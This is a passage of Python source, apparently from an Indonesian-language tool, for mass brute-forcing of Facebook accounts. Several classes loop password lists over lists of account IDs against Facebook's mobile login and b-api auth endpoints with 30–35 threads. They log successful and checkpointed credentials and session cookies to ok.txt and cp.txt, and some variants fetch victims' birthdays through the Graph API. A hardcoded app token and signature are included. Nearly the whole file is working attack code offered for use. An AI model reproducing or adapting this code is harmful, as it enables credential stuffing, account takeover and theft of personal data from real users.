        print("\n\033[97m (\033[96m!\033[97m) Pilihan Invalid")
    elif pmu in["1","01"]:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input("\033[97m (\033[96m•\033[97m) enter kembali ")
        menu()
    elif pmu in["2","02"]:
        change_ugent()
    elif pmu in["3","03"]:
        os.system("rm -rf ugent.txt")
        print("\n%s[%s!%s] %sUser Agent Was Removed"%(k,p,k,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()
    elif pmu in["4","04"]:
        check_ugent()
    elif pmu in["0","00"]:
        menu()
    else:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))

def change_ugent():
    os.system("rm -rf ugent.txt")
    ua = input("\n%s[%s•%s] %sInput User Agent : \n\n%s"%(k,p,k,p,h))
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\n%s[%s•%s] %sSuccess Changed User Agent"%(h,p,h,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()
    except (KeyError, IOError):
        jalan("\n%s[%s•%s] %sFailed To Change User Agent"%(m,p,m,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()

def check_ugent():
    try:
        ungser = open('ugent.txt', 'r').read()
    except IOError:
        ungser = ("%s[%s!%s] %sUser Agent Not Found"%(k,p,k,p))
    except:pass
    print ("\n%s[%s•%s] %sYour User Agent : \n\n%s%s"%(k,p,k,p,h,ungser))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

### BRUTE CRACK ###

def mbasic(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n\033[97m        ﹙\033[96m•\033[97m﹚ 𝙿𝙸𝙻𝙸𝙷 𝚂𝙰𝙽𝙳𝙸 𝙳𝙴𝙵𝙰𝚄𝙻 𝙾𝚁 𝙼𝙰𝙽𝚄𝙰𝙻 ﹙𝙳/𝙼﹚")
		while True:
			f=input("\033[97m        ﹙\033[96m4\033[97m﹚ 𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷... ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print("\n\x1b[0;36m ﹙\x1b[0;37m•\x1b[0;36m﹚𝙲𝚁𝙰𝙲𝙺 𝙼𝚄𝙻𝙰𝙸...\x1b[0;36m ﹙\x1b[0;37m•\x1b[0;36m﹚𝙰𝙺𝚄𝙽 ﹙𝙾𝙺﹚ 𝙳𝙸𝚂𝙸𝙼𝙿𝙰𝙽 𝙳𝙸 𝙾𝙺.𝚃𝚇𝚃 \x1b[0;36m ﹙\x1b[0;37m•\x1b[0;36m﹚𝙰𝙺𝚄𝙽 ﹙𝙲𝙿﹚𝙳𝙸𝚂𝙸𝙼𝙿𝙰𝙽 𝙳𝙸 𝙾𝙺.𝚃𝚇𝚃\n ")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n\033[97m       ﹙\033[96m•﹚𝙿𝙸𝙻𝙸𝙷 𝚂𝙰𝙽𝙳𝙸 𝙳𝙴𝙵𝙰𝚄𝙻 𝙾𝚁 𝙼𝙰𝙽𝚄𝙰𝙻 ﹙𝙳/𝙼﹚")
		while True:
			f=input("\n\033[97m       ﹙\033[96m•\033[97m﹚𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷...")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
						print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s          "%(fl.get("id"),i,ttl)))
						self.cp.append("%s • %s • %s"%(fl.get("id"),i,ttl))
						open("cp.txt","a+").write("%s • %s • %s\n"%(fl.get("id"),i,ttl))
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackffb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n\x1b[0;36m ﹙\x1b[0;37m+\x1b[0;36m﹚ 𝙿𝙸𝙻𝙸𝙷 𝚂𝙰𝙽𝙳𝙸 𝙳𝙴𝙵𝙰𝚄𝙻 𝙾𝚁 𝙼𝙰𝙽𝚄𝙰𝙻 ﹙𝙳/𝙼﹚")
		while True:
			f=input("\n\x1b[0;36m ﹙\x1b[0;37m+\x1b[0;36﹚𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷...")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
   print("\n\x1b[0;36m        ﹙\x1b[0;37m•\x1b[0;36m﹚𝙿𝙸𝙻𝙸𝙷 𝚂𝙰𝙽𝙳𝙸 𝙳𝙴𝙵𝙰𝚄𝙻 𝙾𝚁 𝙼𝙰𝙽𝚄𝙰𝙻 ﹙𝙳/𝙼﹚")
   while True:
      f=input("\x1b[0;36m        ﹙\x1b[0;37m•\x1b[0;36m﹚𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷...")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print("\n\x1b[0;36m        ﹙\x1b[0;37m•\x1b[0;36m﹚𝙿𝙸𝙻𝙸𝙷 𝚂𝙰𝙽𝙳𝙸 𝙳𝙴𝙵𝙰𝚄𝙻 𝙾𝚁 𝙼𝙰𝙽𝚄𝙰𝙻 ﹙𝙳/𝙼﹚")
    while True:
      f=input("\x1b[0;36m        ﹙\x1b[0;37m•\x1b[0;36m﹚𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷...")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### RESULT ###

def results(fourmer,Krahkrah):
        if len(fourmer) !=0:
                print(("﹙𝙾𝙺﹚ : "+str(len(fourmer))))
        if len(Krahkrah) !=0:
                print(("﹙𝙲𝙿﹚ : "+str(len(Krahkrah))))
        if len(fourmer) ==0 and len(Krahkrah) ==0:
                print("\n")
                print("\033[97m (\033[96m!\033[97m) 𝙷𝙰𝚂𝙸𝙻 𝚃𝙸𝙳𝙰𝙺 𝙰𝙳𝙰")

def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Result Crack"+k+" ]"+p))
    print((h+"\n[ "+p+"OK"+h+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

if __name__=="__main__":
	os.system("git pull")
	country()
